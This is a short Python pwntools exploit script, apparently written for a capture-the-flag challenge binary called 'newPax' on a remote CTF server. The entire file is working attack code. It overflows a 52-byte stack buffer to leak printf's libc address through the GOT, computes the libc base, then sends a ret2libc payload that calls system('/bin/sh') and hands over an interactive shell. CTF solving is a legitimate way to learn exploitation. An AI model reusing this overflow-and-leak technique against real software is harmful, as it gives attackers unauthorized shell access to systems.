#! /usr/bin/env python
from pwn import *

program = "./newPax"

#proc = process(program)
proc = remote('pwn.darkarmy.xyz', 5001)

elf_prog = ELF(program)

libc = ELF("/lib32/libc.so.6")
#pid = gdb.attach(proc, '''
#    set pagination off
#    set disassembly-flavor intel    
#    b * 0x08048684
#    continue
#    '''
#    )

plt_printf = elf_prog.plt['printf']
got_printf = elf_prog.got['printf']
main = elf_prog.symbols['main']

align_gadget = 0x080483ba # ret;
# align
payload = b'A'*52 + p32(plt_printf) + p32(main) + p32(got_printf)  

proc.sendline(payload)

libc_printf = proc.recv(numb = 8)

# leak base address
libc_printf = u32(libc_printf[:-1].ljust(4, b'\x00')[0:4])
libc_base = libc_printf - libc.symbols['printf'] 
libc_system = libc_base + libc.symbols['system']
libc_binsh = libc_base + libc.search('/bin/sh').next()
print('libc_printf: ' + str(hex(libc_printf)))
print('libc_base: ' + str(hex(libc_base)))
print('libc_system: ' + str(hex(libc_system)))

payload = b'A'*52 + p32(libc_system) + b'aaaa' + p32(libc_binsh)

proc.sendline(payload)

proc.interactive()



